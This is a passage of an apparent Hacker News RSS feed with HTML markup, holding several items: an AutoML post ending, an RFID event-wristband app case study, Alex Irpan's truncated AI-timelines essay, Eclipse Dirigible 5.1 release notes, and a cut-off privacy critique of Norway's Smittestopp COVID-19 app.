data-image-id="5f26c1ed78e49e62c8ca635f" data-type="image" src="https://images.squarespace-cdn.com/content/v1/5ee8617eedf4d13dcedda79e/1596375534840-SP4HHBADJ9XGQQZUVNSU/ke17ZwdGBToddI8pDm48kBCppz4f318kQhgOkLoMjtx7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1UUHjNPxecGPLsNPOs7j5ghY0WJ3f6AT1P4UchDw8jTgvJvwGh1qtNWvMhYKnvaKhbA/Screen+Shot+2020-08-02+at+13.11.57.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1596374505645_53979"><div><p>Confusion matrix, recall and precision are really interesting metrics to look into when analyzing your model. If you want to utilize AI in your business you should definitely spend some time on this. I wrote a post about this subject <a href="https://www.danrose.ai/blog/vi4gsbdxe78pk3rdhwac8ixbtoin0j"><span>here</span></a>.</p><h2>Connecting to other services</h2><p>Since Google deploy and have an API ready you can from here implement the service into existing web services, mobile apps or other systems. This is really simple and this integration should take long for a developer.</p><h2>Final notes</h2><p>I did this to show how accessible AI really is and hopefully more business will invest in this technology now that the barriers are so low.</p><p>That being said I am a big advocate for the idea that the technical problem in fields like AI is usually the easiest part. Everything around the AI such as the people and processes is usually where the problems start showing. So before you jump right into building AI, spend some time on how it will affect the employees using it and what processes you might want to change. That is usually a very rewardful exercise no matter the technology.</p><p>Have fun building and let me know if you have any fun project ideas I should try out.</p></div></div></div></div></div></div>

        

        
        
          
        
      </div>

      
    </div>
  
</article>

</div>
    </div>
  </div>
</section>

  
</article>

          
          
            

          
          
        
      </div></div>]]>
            </description>
            <link>https://danrose.ai/blog/potato-chips-recognizer-with-google-automl</link>
            <guid isPermaLink="false">hacker-news-small-sites-24269631</guid>
            <pubDate>Tue, 25 Aug 2020 09:49:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Clients’ want-tos: ways to accomplish advanced tasks]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24269587">thread link</a>) | @Headqq
<br/>
August 25, 2020 | https://www.purrweb.com/blog/about-client-requests-wristband/ | <a href="https://web.archive.org/web/*/https://www.purrweb.com/blog/about-client-requests-wristband/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

        

                          <p><em><span>Using the example of the <a href="https://www.purrweb.com/portfolio/wristband/">WRISTBAND event app</a>, I will tell you how to boost up the hard skills of developers and smoothly test new features right while developing a real project.</span></em></p>
<p>Developers, trying to make <del>life</del> the project process easy and improve their skills, bury themselves in useful tools: frameworks, libraries, manuals. In fact, the situation is as follows: unsolved tasks seem to never end, and the extension of the expertise becomes a daily routine. It’s unlikely that we can change it. And seeking to do it is hardly pragmatic</p>
<p>Let’s see what can be optimized!</p>
<h2>How not to drown in the information chaos</h2>
<p>Client feature request – can it be challenging? Of course! To deal with such, some employers prefer to take team training upon themselves: they buy up various courses and tickets to conferences and hackathons. Is it effective? Probably yes. Are there any other options? Our experience shows — yes.</p>
<p>To level up team skills (to handle tough feature request, you should be a pro), we chose a very rational approach: it’s up to a person what and where to learn, which means that the developers are responsible for their own skills. This saves a lot of time since developers learn skills that are required immediately and test them on real projects.</p>
<p>If the client feature request is about working with a technology we aren’t familiar with, we follow the pre-developed plot. I’ll explain it by using the example of a small passing application for the event industry that we’ve created.</p>
<p><img src="https://www.purrweb.com/blog/wp-content/uploads/2020/07/image6.gif" alt="" width="600" height="365"></p>
<h2>The client feature request is to create something we’ve never done before</h2>
<p>To get more details about this feature request, let us tell you a story. We received a trial task to develop a mobile application from startupers who lived in New Orlean and sold IT-solutions for event organizers. Ok. We’ve got a task. The task was to build a service for security guards which will reduce queues at the entrance and make it real for guests to pass through by using wristbands with RFID-tags.</p>

<p>Creating an interface for this mini-app — only three screens — dead easy for us. But its performance was to be provided by technologies we weren’t sure of. In particular, this applied to RFID tags. At the time, we didn’t work with them, and online research didn’t give a clear answer to our question if there are libraries that can read them.</p>
<p>Additional conditions set by the clients during the briefing made the overall situation even worse. Go ahead and find out what happened.</p>
<p><a href="https://www.purrweb.com/blog/wp-content/uploads/2020/07/image1.png"><img src="https://www.purrweb.com/blog/wp-content/uploads/2020/07/image1.png" alt="" width="1400" height="900" srcset="https://www.purrweb.com/blog/wp-content/uploads/2020/07/image1.png 1400w, https://www.purrweb.com/blog/wp-content/uploads/2020/07/image1-300x193.png 300w, https://www.purrweb.com/blog/wp-content/uploads/2020/07/image1-768x494.png 768w, https://www.purrweb.com/blog/wp-content/uploads/2020/07/image1-1024x658.png 1024w" sizes="(max-width: 1400px) 100vw, 1400px"></a></p>
<h2>The first stage: complexity estimation</h2>
<p>One of the main project challenges — deadlines (tough feature request isn’t the only thing we should worry about). We had less than a month. Besides it, another factor impeding the situation was that the service was to be used from a rare smartphone model that could not be obtained.</p>
<p>One more thing: the application needed steady offline mode. At events (especially held in the open air), there are often problems with the internet connection but a bad signal should not slow down the work of the guards. The app was to be designed so it could work without connection but sync with the server as soon as the internet shows up. What if someone bought a ticket at the last moment or after the event starts?</p>
<p>Handling this feature request didn’t seem challenging, but everything had to be done flawlessly. As it’s supposed that letting through would take no more than 2 seconds, lags and slowdowns were not allowed.</p>
<p><a href="https://www.purrweb.com/blog/wp-content/uploads/2020/07/image8.png"><img src="https://www.purrweb.com/blog/wp-content/uploads/2020/07/image8.png" alt="" width="1400" height="900" srcset="https://www.purrweb.com/blog/wp-content/uploads/2020/07/image8.png 1400w, https://www.purrweb.com/blog/wp-content/uploads/2020/07/image8-300x193.png 300w, https://www.purrweb.com/blog/wp-content/uploads/2020/07/image8-768x494.png 768w, https://www.purrweb.com/blog/wp-content/uploads/2020/07/image8-1024x658.png 1024w" sizes="(max-width: 1400px) 100vw, 1400px"></a></p>
<h2>The second stage: implementation and testing</h2>
<p>As we had less than a month, our strategy was like this: 2 days to test the most problematic features and if find a solution — keep working. The clients were pleased with it and we dug deep in the development stage.</p>
<p>First, we plumbed the depths of RFID tags. We chose several libraries that could help us manage this task. We then discovered that RFID tag — is a predecessor of NFC technology, hence theoretically any smartphone with an NFC module could ‘understand’ the information in the bracelet.</p>
<p>As a result, we created the technical prototype and tested the needed set of features (using our own smartphones and credit cards). The original hypothesis was confirmed, and the library didn’t fail. Since we didn’t have the opportunity to test this functionality on the right model, we sent a technical prototype to the clients. Everything worked as expected, and we promptly switched to other tasks that were not somehow difficult.</p>

<p>So what did we get? A very minimalistic design with traditional ‘traffic light’ colors: red — if the guest doesn’t have access to a zone, and yellow — if the check-in stage was passed earlier. Additionally, app work was accompanied by relevant audio signals which helped to reduce the time of passage of a person through the control point.</p>
<p><a href="https://www.purrweb.com/blog/wp-content/uploads/2020/07/image5.png"><img src="https://www.purrweb.com/blog/wp-content/uploads/2020/07/image5.png" alt="" width="1400" height="900" srcset="https://www.purrweb.com/blog/wp-content/uploads/2020/07/image5.png 1400w, https://www.purrweb.com/blog/wp-content/uploads/2020/07/image5-300x193.png 300w, https://www.purrweb.com/blog/wp-content/uploads/2020/07/image5-768x494.png 768w, https://www.purrweb.com/blog/wp-content/uploads/2020/07/image5-1024x658.png 1024w" sizes="(max-width: 1400px) 100vw, 1400px"></a></p>
<h2>The third stage: consolidation of knowledge</h2>
<p>What can help you in mastering a new feature (and handling client feature request — particularly, the toughest ones) is telling your teammates about it. Unlike attending conferences, this practice is a mandatory and regular ritual that happens several times a month in our team. No preludes or formalities — a short speech of 30 minutes is enough.</p>
<p>As part of an in-company meetup, we discuss not only features but also the process of solving problems. Sometimes we end with a detailed guide — this works in cases when the team regularly uses a particular technology (for example, FaceID).</p>
<p><a href="https://www.purrweb.com/blog/wp-content/uploads/2020/07/image2.png"><img src="https://www.purrweb.com/blog/wp-content/uploads/2020/07/image2.png" alt="" width="1400" height="900" srcset="https://www.purrweb.com/blog/wp-content/uploads/2020/07/image2.png 1400w, https://www.purrweb.com/blog/wp-content/uploads/2020/07/image2-300x193.png 300w, https://www.purrweb.com/blog/wp-content/uploads/2020/07/image2-768x494.png 768w, https://www.purrweb.com/blog/wp-content/uploads/2020/07/image2-1024x658.png 1024w" sizes="(max-width: 1400px) 100vw, 1400px"></a></p>
<p>Initially, it seemed that programmers would be skeptical about such performances and the prospect of broadcasting ‘about something’ in public would strain them. In fact, it turned out differently: the opportunity to share experience was taken with sympathy. People were glad to get the chance to be an expert. Plus, such events added value to the work and greatly improved the team spirit.</p>
<h2>Conclusion</h2>
<p>The app and the wristband have successfully worked at several events, and the project is now actively developing. What about us: we have been working on the contactless payment feature and we’re almost in the home stretch, which means that the bracelet will contain not only information about access to specific zones but also turn into an e-wallet that can be used for transactions at the event.</p>
<p><a href="https://www.purrweb.com/blog/wp-content/uploads/2020/07/image3.png"><img src="https://www.purrweb.com/blog/wp-content/uploads/2020/07/image3.png" alt="" width="1400" height="900" srcset="https://www.purrweb.com/blog/wp-content/uploads/2020/07/image3.png 1400w, https://www.purrweb.com/blog/wp-content/uploads/2020/07/image3-300x193.png 300w, https://www.purrweb.com/blog/wp-content/uploads/2020/07/image3-768x494.png 768w, https://www.purrweb.com/blog/wp-content/uploads/2020/07/image3-1024x658.png 1024w" sizes="(max-width: 1400px) 100vw, 1400px"></a></p>
<p>For example, you will be able to pay via it for a dish on the food court or in the shop zone. Thus, the app has become the basis for an infrastructure service that allows to collect detailed statistics about the event and purchases made during it. And we have got a promising client who likes to experiment with technology and is ready to entrust us with the most complex pieces.</p>
              </div></div>]]>
            </description>
            <link>https://www.purrweb.com/blog/about-client-requests-wristband/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24269587</guid>
            <pubDate>Tue, 25 Aug 2020 09:42:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[E-Yuan (China's coin) is fake, who would have guessed]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24269449">thread link</a>) | @phorcys
<br/>
August 25, 2020 | https://git.rip/phorcys/e-yuan-is-scam | <a href="https://web.archive.org/web/*/https://git.rip/phorcys/e-yuan-is-scam">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div dir="auto">

<p>Info: SSH access won't work right now</p>

</div></div>]]>
            </description>
            <link>https://git.rip/phorcys/e-yuan-is-scam</link>
            <guid isPermaLink="false">hacker-news-small-sites-24269449</guid>
            <pubDate>Tue, 25 Aug 2020 09:11:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[My AI Timelines Have Sped Up]]>
            </title>
            <description>
<![CDATA[
Score 77 | Comments 72 (<a href="https://news.ycombinator.com/item?id=24269316">thread link</a>) | @T-A
<br/>
August 25, 2020 | https://www.alexirpan.com/2020/08/18/ai-timelines.html | <a href="https://web.archive.org/web/*/https://www.alexirpan.com/2020/08/18/ai-timelines.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
    <p>For this post, I’m going to take artificial general intelligence (AGI) to mean
an AI system that matches or exceeds humans at almost all (95%+)
economically valuable work. I prefer this definition because it focuses on what
causes the most societal change, rather than how we get there.</p>

<p>In 2015, I made the following forecasts about when AGI could happen.</p>

<ul>
  <li>10% chance by 2045</li>
  <li>50% chance by 2050</li>
  <li>90% chance by 2070</li>
</ul>

<p>Now that it’s 2020, I’m updating my forecast to:</p>

<ul>
  <li>10% chance by 2035</li>
  <li>50% chance by 2045</li>
  <li>90% chance by 2070</li>
</ul>

<p>I’m keeping the 90% line the same, but shifting everything else to
be faster. Now, if you’re looking for an argument of why I picked these particular
years, and why I shifted by 10 years instead of 5 or 15, you’re going to be
disappointed. Both are driven by a gut feeling.
What’s important is why parts of my thinking have changed - you can choose
your own timeline adjustment based on that.</p>

<p>Let’s start with the easy part first.</p>

<h2 id="i-should-have-been-more-uncertain">I Should Have Been More Uncertain</h2>

<p>It would be incredibly weird if I was never surprised by machine learning (ML)
research.
Historically, it’s very hard to predict the trajectory a research field will
take, and if I were never surprised, I’d take that as a personal failing to
not consider large enough ideas.</p>

<p>At the same time, when I think back on the past 5 years, I believe I was
surprised more often than average. It wasn’t all in a positive direction.
Unsupervised learning got better way faster than I expected. Deep reinforcement
learning got better
a little faster than I expected. Transfer learning has been slower than
expected. Combined, I’ve decided I should widen the distribution of outcomes,
so now I’m allocating 35 years to the 10%-90% interval instead of 25 years.</p>

<p>I also noticed that my 2015 prediction placed 10% to 50% in a 5 year range,
and 50% to 90% in a 20 year range. AGI is a long-tailed event, and there’s
a real possibility it’s never viable, but a 5-20 split is absurdly skewed.
I’m adjusting accordingly.</p>

<p>Now we’re at the hard part. Why did I choose to shift the 10% and 50% lines
closer to present day?</p>



<p>Three years ago, I was talking to someone who mentioned
that <a href="https://intelligence.org/2017/10/13/fire-alarm/">there was no fire alarm for AGI</a>.
I told them I knew Eliezer Yudkowsky had written another post about AGI, and
I’d seen it shared among Facebook friends, but I hadn’t gotten around to reading it.
They summarized it as, “It will never be obvious when AGI is going to occur.
Even a few years before it happens, it will be possible to argue AGI is far
away. By the time it’s common knowledge that AI safety is the most
important problem in the world, it’ll be too late.”</p>

<p>And my reaction was, “Okay, that matches what I’ve gotten from my Facebook
timeline. I already know the story of
Fermi predicting <a href="https://books.google.com/books?id=aSgFMMNQ6G4C&amp;pg=PA813&amp;lpg=PA813&amp;dq=weart+fermi&amp;source=bl&amp;ots=Jy1pBOUL10&amp;sig=c9wK_yLHbXZS_GFIv0K3bgpmE58&amp;hl=en&amp;sa=X&amp;ved=0ahUKEwjNofKsisnWAhXGlFQKHbOSB1QQ6AEIKTAA#v=onepage&amp;q=%22ten%20per%20cent%22&amp;f=false">a nuclear chain reaction was very likely
to be impossible</a>, only a few years before he worked on the
Manhattan Project. More recently, we had
<a href="https://www.wired.com/2014/05/the-world-of-computer-go/">Rémi Coulom state that superhuman Go was about 10 years away</a>,
one year before <a href="https://arxiv.org/abs/1412.6564">the first signs it could happen</a>,
and two years before <a href="https://en.wikipedia.org/wiki/AlphaGo_versus_Lee_Sedol">AlphaGo</a> made it official.
I <em>also</em> already know the <a href="https://en.wikipedia.org/wiki/Common_knowledge_(logic)">common knowledge</a>
arguments for AI safety.”
I decided it wasn’t worth my time to read it.</p>

<p>(If you haven’t heard the common knowledge arguments, here’s the quick
version: it’s possible for the majority to believe AI safety is
worthwhile, even if no one says so publicly, because each individual could be
afraid everyone else will call them crazy if they argue for drastic action. This can happen
even if literally everyone agrees, because they don’t know that everyone agrees.)</p>

<p>I read the post several years later out of boredom, and
I now need to retroactively complain to all my Facebook friends who only
shared the historical events and common knowledge arguments. Although
that post summary is <em>correct</em>, the ideas I found useful were all
<em>outside that summary</em>. I trusted you, filter bubble! How could you let me
down like this?</p>

<p>Part of the fire alarm post proposes hypotheses for why people claim AGI is
impossible. One of the hypotheses is that researchers pay too much attention
to the difficulty of getting something working with their current tools,
extrapolate that difficulty to the future, and conclude we could never create
AGI because the available tools aren’t good enough.
This is a bad argument, because your extrapolation needs to account for
research tools also improving over time.</p>

<p>What “tool” means is a bit fuzzy. One clear example is our coding libraries.
People used to write neural nets in Caffe, MATLAB, and Theano. Now it’s mostly
TensorFlow and PyTorch. A less obvious example is
feature engineering for computer vision. When was the
last time anyone talked about <a href="https://en.wikipedia.org/wiki/Scale-invariant_feature_transform">SIFT features</a> for computer vision? Ages ago,
they’re obsolete. But feature engineering didn’t disappear, it just turned into
<a href="https://en.wikipedia.org/wiki/Convolutional_neural_network">convolutional neural net</a> architecture tuning instead.
For a computer vision researcher, SIFT features were the old tool,
convolutional neural nets are the new tool, and computer vision is the application
that’s been supercharged by the better tool.</p>

<p>Whereas for me, I’m not a computer vision person. I think ML for control is a much
more interesting problem. However, you have to do computer vision to do control
in image-based environments, and if you want to handle the real world, image-based
inputs are the way to go. So for me, computer vision is the tool, robotics
is the application, and the improvements in computer vision have driven many
promising robot learning results.</p>

<p><img src="https://www.alexirpan.com/public/ai-timelines/filters.png" alt="AlexNet conv filters"></p>

<p>(Filters automatically learned by <a href="https://en.wikipedia.org/wiki/AlexNet">AlexNet</a>, which has
itself been obsoleted by the better tool, <a href="https://en.wikipedia.org/wiki/Residual_neural_network">ResNets</a>.)</p>

<p>I’m a big advocate for research tools. I think on average, people underestimate
their impact. So after reading the hypothesis that people don’t forecast
tool improvement properly, I thought for a bit, and decided I hadn’t properly
accounted for it either. That deserved shaving off a few years.</p>

<p>In the more empirical sides of ML, the obvious components of progress are your
ideas and computational budget, but there are less obvious ones too, like
your coding and debugging skills, and your ability to utilize your compute.
It doesn’t matter how many processors you have per machine, if your code doesn’t
use all the processors available.
There are a surprising number of ML applications where the main value-add
comes from better data management and data summarizing,
because those tools free up decision making time for everything else.</p>

<p>In general, everyone’s research tools are deficient in some way.
Research is
about doing something new, which naturally leads to discovering new problems,
and it’s highly unlikely someone’s already made the perfect tool for a problem
that didn’t exist three months ago. So, your current
research tools will <em>always</em> feel janky, and you shouldn’t be using that to
argue anything about timelines.</p>

<p>The research stack has lots of parts, improvements continually happen across that
entire stack, and most of
these improvements have multiplicative benefits. Multiplicative factors
can be very powerful.
One simple example is that to get 10x better results, you can either make one
thing 10x better with a paradigm shift, or you can make ten different
things
<a href="https://www.google.com/search?&amp;q=1.26^10">1.26x better</a>, and they’ll combine
to a 10x total improvement.
The latter is just as transformative, but can be much easier,
especially if you get 10 experts with different skill sets
to work together on a common goal. This is how corporations become a thing.</p>

<p><img src="https://www.alexirpan.com/public/ai-timelines/tiny-gains-graph.jpg" alt="Tiny gains graph"></p>

<p>(From <a href="https://jamesclear.com/marginal-gains">JamesClear.com</a>)</p>

<h2 id="semi-supervised-and-unsupervised-learning-are-getting-better">Semi-Supervised and Unsupervised Learning are Getting Better</h2>

<p>Historically, unsupervised learning has been in this weird position where it is
obviously the right way to do learning, and also a complete waste of time if
you want something to work ASAP.</p>

<p>On the one hand, humans don’t have labels for most things they learn,
so ML systems shouldn’t need labels either. On the other hand, the
deep learning boom of 2015 was mostly powered by supervised learning on
large, labeled datasets.
Richard Socher made a notable tweet at the time:</p>

<div>
<blockquote><p lang="en" dir="ltr">Rather than spending a month figuring out an unsupervised machine learning problem, just label some data for a week and train a classifier.</p>— Richard Socher (@RichardSocher) <a href="https://twitter.com/RichardSocher/status/840333380130553856?ref_src=twsrc%5Etfw">March 10, 2017</a></blockquote> 
</div>

<p>I wouldn’t say unsupervised learning has always been useless. In 2010, it was
common wisdom that deep networks should go through an unsupervised pre-training
step before starting supervised learning. See <a href="https://jmlr.csail.mit.edu/papers/volume11/erhan10a/erhan10a.pdf">(Erhan et al, JMLR 2010)</a>.
In 2015, self-supervised word vectors like <a href="https://nlp.stanford.edu/projects/glove/">GloVe</a>
and <a href="https://en.wikipedia.org/wiki/Word2vec">word2vec</a> were automatically
learning interesting relationships between words.
As someone who started ML around 2015,
these unsupervised successes felt like exceptions to the rule. Most other
applications relied on labels. Pretrained ImageNet features
were the closest thing to general behavior, and those features were learned
from scratch through only supervised learning.</p>

<p>I’ve long agreed that unsupervised learning is the future, and the right way
to do things, as soon as we figure out how to do so.
But man, we have spent a long time trying to do so.
That’s made me
pretty impressed with the semi-supervised and unsupervised learning papers from
the past few months.
Momentum Contrast from <a href="https://arxiv.org/abs/1911.05722">(He et al, CVPR 2020)</a>
was quite nice, SimCLR from <a href="https://arxiv.org/abs/2002.05709">(Chen et al, ICML 2020)</a> improved
on that, and Bootstrap Your Own Latent <a href="https://arxiv.org/abs/2006.07733">(Grill, Strub, Altché, Tallec, Richemond et al, 2020)</a>
has improved on that. And then there’s <a href="https://arxiv.org/abs/2005.14165">GPT-3</a>,
but I’ll get to that later.</p>

<p>When I was thinking through what made ML hard, the trend lines were pointing to larger
models and larger labeled datasets. They’re still pointing that way now.
I concluded that future ML progress would be bottlenecked by labeling requirements.
Defining a 10x bigger model is easy. <em>Training</em> a 10x bigger model is harder, but
it doesn’t need 10x as many people to work on it. Getting 10x as many labels
does. Yes, data labeling tools are getting better, <a href="https://en.wikipedia.org/wiki/Amazon_Mechanical_Turk">Amazon Mechanical Turk</a> is very popular, and there are even
startups whose missions are to provide fast data labeling …</p></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.alexirpan.com/2020/08/18/ai-timelines.html">https://www.alexirpan.com/2020/08/18/ai-timelines.html</a></em></p>]]>
            </description>
            <link>https://www.alexirpan.com/2020/08/18/ai-timelines.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24269316</guid>
            <pubDate>Tue, 25 Aug 2020 08:41:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Eclipse Dirigible 5.1.0]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24269256">thread link</a>) | @delchevn
<br/>
August 25, 2020 | https://www.dirigible.io/release/2020/08/24/news_new_release_5_1.html | <a href="https://web.archive.org/web/*/https://www.dirigible.io/release/2020/08/24/news_new_release_5_1.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
			<header>
				
				
				<sub>August 24, 2020</sub>
				
			</header>
			<p>New version <a href="https://download.eclipse.org/dirigible/drops/R-5.1-202008241951/index.html">5.1</a> has been released.</p>

<p>Release is of <em>Type A</em></p>

<h4 id="features">Features</h4>

<ul>
  <li>Support for required properties</li>
  <li>Security Roles management the Entity/Property UIs</li>
  <li>Support for more widget types</li>
  <li>Support for pattern based validation</li>
  <li>Support for widget length</li>
  <li>Support for pattern hint</li>
  <li>Support for Color widget type</li>
  <li>Projection Entity type introduced</li>
  <li>Application template separation</li>
  <li>SAP Cloud Foundry - Runtime Only Image</li>
  <li>Enhanced build of application WAR from the pre-defined packages</li>
  <li>SAP Cloud Foundry Ephemeral - Runtime Only</li>
  <li>Form Builder - Experimental</li>
</ul>

<h4 id="fixes">Fixes</h4>

<ul>
  <li>List the available icon names in a dropdown</li>
  <li>SAP Cloud Foundry - Missing Default Database Configuration</li>
  <li>SAP CMS - MS files content type override</li>
  <li>Minor fixes</li>
</ul>

<h4 id="statistics">Statistics</h4>

<ul>
  <li>54K+ Users</li>
  <li>77K+ Sessions</li>
  <li>184 Countries</li>
  <li>394 Repositories in DirigibleLabs</li>
</ul>

<h4 id="operational">Operational</h4>

<ul>
  <li>Available packages for download - <a href="https://download.eclipse.org/dirigible/drops/R-5.1-202008241951/index.html">https://download.eclipse.org/dirigible/drops/R-5.1-202008241951/index.html</a></li>
  <li>Docker images at Docker Hub under DirigibleLabs organization:	<a href="https://hub.docker.com/u/dirigiblelabs/">https://hub.docker.com/u/dirigiblelabs/</a></li>
  <li>Maven Central artifacts by org.eclipse.dirigible namespace: <a href="https://search.maven.org/search?q=org.eclipse.dirigible">https://search.maven.org/search?q=org.eclipse.dirigible</a></li>
  <li>The full list of bug-fixes and enhancements can be found here: <a href="https://github.com/eclipse/dirigible/milestone/35?closed=1">https://github.com/eclipse/dirigible/milestone/35?closed=1</a></li>
  <li>The source code is available at GitHub repository here: <a href="https://github.com/eclipse/dirigible/tree/5.1.0">https://github.com/eclipse/dirigible/tree/5.1.0</a></li>
  <li>The instant trial is updated accordingly with the released version here: <a href="http://trial.dirigible.io/">http://trial.dirigible.io</a></li>
</ul>

<h4 id="enjoy">Enjoy!</h4>

		</article></div>]]>
            </description>
            <link>https://www.dirigible.io/release/2020/08/24/news_new_release_5_1.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24269256</guid>
            <pubDate>Tue, 25 Aug 2020 08:31:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[My reflections on Smittestopp (Norwegian Covid-app)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24269039">thread link</a>) | @eivarv
<br/>
August 25, 2020 | https://www.eivindarvesen.com/blog/2020/06/27/my-reflections-on-smittestopp | <a href="https://web.archive.org/web/*/https://www.eivindarvesen.com/blog/2020/06/27/my-reflections-on-smittestopp">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
                <p>We – the government appointed expert group – published our final public report last month (informally summarized by me in English <a href="https://www.eivindarvesen.com/blog/2020/05/20/smittestopp-summarized">here</a>) on the Norwegian COVID-19 app "Smittestopp", ascertaining whether security and privacy is responsibly taken care of.</p>
<p>In a group effort such as this one, there is often compromise –&nbsp;in order to be able to end up with a result everyone involved can justify to themselves, and stand by.</p>
<p><strong>We all agree on the conclusion in our report.</strong></p>
<p>There are, however – in <em>my</em> opinion – certain issues that are not addressed in the final report (and that might be out of scope for the report), that I think are imporant to consider. I will state some of these here, in addition to expanding on issues that appear in the report.</p>
<p><em>What I write here is my own professional opinion on security- and privacy aspects of the Norwegian COVID-19 contact tracing app, "Smittestopp". I do not (and can not) speak on behalf of any other persons, including any other members of the government appointed expert group. Nothing described herein is covered by NDA or legislation – everything is completely based on public information and what is described in our public report.</em></p>
<h2>Introduction and Context</h2>
<p>Comparatively, Norway was fairly early in rolling out an app, and the app itself is arguably one of the most invasive ones on the market – at least in a European context, where there are few (if any) other countries with the same configuration of privacy-impacting factors.</p>
<p>Smittestopp&nbsp;is a closed-source solution; requires registration and de facto identification of users; collects sensor data from multiple sources (both BLE and GPS); and uploads data from all users, all of the time, to a centralized storage – unless users pause collection, but even then "heartbeats" that contain information about BLE and GPS-activations in the app are sent in the background. </p>
<p>The degree to which (if any) there is data minimization in such a solution has been questioned by experts in public debate from the get-go.</p>
<p>Some of the design choices has been defended by involved parties in the media, as a prerequisite for attempting to both contact tracing <em>and</em> generating data for monitoring of public movement and other research and analysis purposes (including datasets for long term use).
One might then question the choice of attempting to solve both problems with one application, and what the privacy implications of this might be.</p>
<p>Any privacy engineer (and indeed many others with a modicum of technical or practical understanding) will quickly see that these design choices have practical consequences – and, in my assessment, huge privacy implications.</p>
<h2>Location data</h2>
<p><img src="https://www.eivindarvesen.com/content/blog/2020/06/27/location.jpg" alt="Man on a smartphone" title="Man on a smartphone"></p>
<p>What one is interested in when performing contact tracing is "who met whom". The identity of either party, or the location of contact is not relevant to prove contact.
You thus don't necessarily need to know <em>who</em> the involved parties are, or <em>where</em> the contact took place.</p>
<p>The argument made for the use of location data in the case of Smittestopp is to attempt to compensate for lack in data quality as a consequence of Bluetooth API limitations at the time: Bluetooth wouldn't work reliably in the backround on iOS, whereas Android might kill apps that continuously used Bluetooth or location services in the background.</p>
<p>On the other hand, GPS has a typical accuracy of 3 - 10 meters under ideal conditions (meaning outdoor usage).</p>
<p>A proper and transparent evaluation of the possibilities available here might then include:</p>
<ul>
<li>How big of a problem does the current API limitations pose in practice (i.e. "could we get by at all?")</li>
<li>If workarounds are needed, how do we evaluate alternatives (for instance, non-exhaustively):
<ul>
<li>Attempting to "live with" the current limitations</li>
<li>The Singaporean approach (in practice implementing a faux sleep-mode, necessitating keeping the app in foreground, but dimming screen when device is positioned "upside-down")</li>
<li>Collecting location data, which is Personally Identifiable Information (PII)</li>
</ul></li>
<li>How do the privacy implications of the respective alternatives size up against each other and the issue at hand?</li>
</ul>
<p>Though it has been claimed that this data is "anonymous" in several contexts, this is incorrect. By virtue of being personally identifiable information, location data cannot be anonymous by definition.
Location data can in itself reveal a person's identity. There is no such thing as "anonymous location data" on an individual basis. In aggregated datasets, one can have certain quantifiable guarantees about degree of privacy (e.g. via <a href="https://en.wikipedia.org/wiki/K-anonymity" target="_blank" rel="noopener noreferrer">k-anonymity</a>, <a href="https://en.wikipedia.org/wiki/Differential_privacy" target="_blank" rel="noopener noreferrer">differential privacy</a>), but this gets complicated very quickly for a variety of reasons, such as temporal correlations or re-identification by combining data sources.</p>
<p>In practice, location data is only a <em>clear</em> functional requirement (of sorts, not necessarily to this degree of accuracy) in the case of monitoring public movement or other research – the second purpose of the app.</p>
<h2>Centralized storage</h2>
<p>When we talk about centralized storage in the context of contact tracing apps, we usually mean systems that are based on collection that is uploaded to a central server, which holds all data. This is in contrast with decentralized systems, where every user's data is stored on their device – until it is needed. One should also note that most popular decentralized solutions are not <em>distributed</em>, i.e. they still use a central server as a communications channel of some sort (as opposed to purely peer-to-peer communications).</p>
<p>The argument made in favor of data centralization in the case of Smittestopp is that augmentation of user data with data from other users is needed in analysis. It is also a prerequisite for the purpose of looking at movement patterns (to evaluate government actions), or do further unspecified research on aggregated data – which is also a purpose of the same app.</p>
<p>A centralized datastore is in principle a defining factor when dealing with private data. Its very existence makes misuse, function creep, leakage and so on possible in a way that a decentralized solution just plainly doesn't –&nbsp;as you can't lose or abuse data you don't have.</p>
<p>Alternative sources to aggregated data may already exist, such as the data telco's already provide in aggregate form, and which has already been used for the same purposes in Norway. The upside in using this is reusing existing data (not collecting, storing, protecting the same data) and existing control mechanisms that protects security and privacy. The downside is that this data might not be as precise as location data collected directly from devices, as resolution would depend on a host of factors, including cell site density.</p>
<p>The privacy cost of uploading every user's locations and movements, as well as who they have met, and timestamps for all these events is undoubtably <em>much</em> larger than uploading what data is needed <em>when</em> needed, e.g. prompting users to upload their movements (or even just BLE-defined contacts) once a person they have been in contact with is positively diagnosed with COVID-19.</p>
<h2>Two purposes</h2>
<p>The current app is all-or-nothing, in that users can chose to have their data used for all the app's purposes, or to not use the app.</p>
<p>It is obviously not ideal to <em>not</em> let users explicitly opt in for either purpose. Nor is it in accordance with regular GDPR-demands (though we must remember that this is a major crisis), nor even best practice. A potential consequence of implementing one app that collects <em>a lot</em> of data (as a consequence of enabling two purposes), as well as not giving users a choice is that user uptake may be hampered.</p>
<h2>Data integrity and user traceability</h2>
